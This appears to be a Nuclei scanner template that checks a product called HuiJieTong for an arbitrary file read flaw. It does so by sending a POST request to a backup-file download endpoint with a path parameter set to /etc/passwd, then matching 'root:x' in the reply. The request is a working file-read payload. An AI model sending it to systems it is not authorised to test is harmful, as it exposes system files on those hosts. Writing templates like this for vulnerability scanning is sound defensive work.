id: HuiJieTong-fileDownload-ReadAnyFile

info:
  name: HuiJieTong-fileDownload-ReadAnyFile
  author: iSee857
  severity: high
  description: HuiJieTong-fileDownload-ReadAnyFile

requests:
  - method: POST
    raw:
      - |
        POST /fileDownload?action=downloadBackupFile HTTP/1.1
        Host: {{Host}}
        Accept: */*
        Content-type: application/x-www-form-urlencoded
        Connection: close

        fullPath=%2Fetc%2Fpasswd

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "bin"
          - "root:x"
        condition: and
        part: body

      - type: status
        status:
          - 200